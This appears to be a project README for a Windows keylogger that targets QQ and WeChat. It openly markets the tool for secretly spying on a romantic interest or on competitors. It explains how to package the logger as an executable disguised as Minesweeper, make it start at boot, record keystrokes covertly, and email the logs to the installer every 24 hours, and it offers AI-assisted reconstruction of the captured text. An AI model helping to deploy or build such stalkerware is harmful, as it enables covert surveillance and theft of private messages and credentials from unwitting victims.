# üéπ Keyboard Activity Monitor

## üìã Overview

Still hung up on a girl you like? Anxious about your competitors? This program can help you monitor keyboard activities of target applications (like QQ or WeChat) and record the data, automatically sending it to your email after a period of time.

### ‚öôÔ∏è Feature Overview

- **üîç Application Monitoring**: The program monitors the running status of specified applications and starts recording keyboard activities when the target application is detected.
- **üîÑ Auto Start at Boot**: After the packaged file is run, it will automatically add itself to the startup folder, enabling it to start with the system.
- **‚å®Ô∏è Keyboard Logging**: Records detailed information about keyboard presses, including key content, key press count, and time of the key press.
- **üíæ Data Storage**: The recorded data is stored as compressed binary files to save storage space.
- **üìß Email Sending**: The program periodically checks and sends the recorded keyboard data via a specified email address.
- **üìä Data Reading**: Provides a separate program `Read.py` for decompressing and reading the stored binary data, displaying it in a tabular format that can be exported as a CSV or Excel file.
- **üõ†Ô∏è Packaging Tool**: Offers a [Packaging Tool](https://github.com/ystemsrx/Application-Monitoring/releases) that can package the program into a single executable file, with support for custom icons.

### üìÅ File Descriptions

- **Application_Monitoring**: The main program used to monitor the running status of QQ and WeChat, record keyboard activities, save data as compressed binary files, and periodically send the data via email.
- **Read.py**: A data reading tool that decompresses and reads the binary files generated by `Application_Monitoring`, providing data visualization and export functionality. We also added AI-powered data interpretation to this tool (you need to provide **your own API** and fill in the list at the beginning of the code; currently, only OpenAI, Zhipu Qingyan, and Tongyi Qianwen are supported).
- **Package_tool.py**: A packaging tool used to package Python scripts into a single executable file with support for custom icons.

### üìù Usage Instructions

1. **Monitoring and Logging**:
   - Package `Application_Monitoring` (using the [packaging tool](https://github.com/ystemsrx/Application-Monitoring/releases)) into an exe, then run it on the target computer. The program will continuously and automatically monitor the running status of QQ and WeChat in the background and start recording keyboard input.
   - Data is stored in real-time in the `key_data.bin` file.
   - Every 24 hours, the data will be sent to your email.
   - Don‚Äôt worry about needing a reason to get the target to open the file. This file can disguise itself as a Minesweeper game, with the packaged version only being 11MB in size. After running, it will open Minesweeper while the monitoring program runs in the background, and even if Minesweeper is closed, it won‚Äôt affect the monitoring.
   - The program automatically detects whether it‚Äôs being run at startup or manually, so there‚Äôs no need to worry about Minesweeper popping up on startup.

2. **Reading and Exporting**:
   - Run the `Read.py` program and drag in the `key_data.bin` file to view the recorded keyboard input data.
     
     ‚ö†**Important: Running [Read.py](Read.py) requires the installation of `PyQt5`, `Pandas`, and `Requests`. Install them by running `pip install pyqt5 pandas requests`.**

   - You can filter and export the data as a CSV or Excel file for further analysis.
   - The tool also supports AI-powered data recovery (API KEY required, currently only OpenAI, Zhipu Qingyan, and Tongyi Qianwen are supported).

3. **Packaging Tool**:

   - Your computer must have Python installed, which can be downloaded [here](https://www.python.org/downloads/release/python-3125/).
   - The packaging tool allows you to package the above scripts into standalone executable files. [Click here](https://github.com/ystemsrx/Application-Monitoring/releases) to package the script by dragging it into the interface. It supports adding custom icons (just drag in the image or icon).

### üñãÔ∏è Fields to Fill In

There are a few fields in the `Application_Monitoring` file that need to be filled in or modified to ensure the program works as expected:

1. **üìß Email Configuration**:
   - `from_addr`: The sender's email address.
   - `to_addr`: The recipient's email address.
   - `password`: The SMTP authorization code for the sender's email. Please search for how to obtain the authorization code.

   Example:
   ```python
   from_addr = "your_email@example.com"
   to_addr = "recipient_email@example.com"
   password = "your_email_password_or_smtp_token"
   ```

2. **üíΩ File Storage Path**:
   - `compressed_file`: The file path for storing compressed data. Please modify the storage path as needed, ensuring the program has permission to read/write files in that path. It is recommended to store files on a drive other than the C drive.

   Example:
   ```python
   compressed_file = "D:\\your_path\\compressed_key_data.bin"
   ```

3. **‚è∞ Interval Setting**:
   - `interval_time`: The program is set by default to send the recorded email every 24 hours (86400 seconds). You can modify this interval as needed. The default is 24h.

   For example, to send every 12 hours:
   ```python
   interval_time = 43200:  # 12 hours in seconds
   ```

4. **üì± Application List**:
   - Add applications in `applications = ["QQ", "WeChat"]`. The default is QQ and WeChat. Separate the applications with commas and enclose them in quotes. **Note**: Applications should be named according to the process name rather than the application name (you can see this in Task Manager). For example, **WeCom** is called **WXWork**.

5. **ü§ñ API List in [Read.py](Read.py)**:
   - If you need to use the AI data interpretation feature, please fill in your API KEY in the list. If you don‚Äôt want to include it in the list, you can temporarily fill it in when the program starts. Currently, the supported API KEYs are only for OpenAI, Zhipu Qingyan, and Tongyi Qianwen. Additionally, you can add more models in the `setup_model_selector` function.

### ‚úÖ TODO List

- [x] **Unified Application Monitoring**: By entering the application name in the list, you can monitor the application without manually adjusting the program code.

- [x] **Data Interpretation Tool**: The current program can only record key content but cannot interpret complete Pinyin input. A tool will be developed in the future to interpret and reconstruct the actual text input by the user, making the input content more intuitive to understand.

- [X] **Auto Start at Boot**: Added the ability to start at boot.
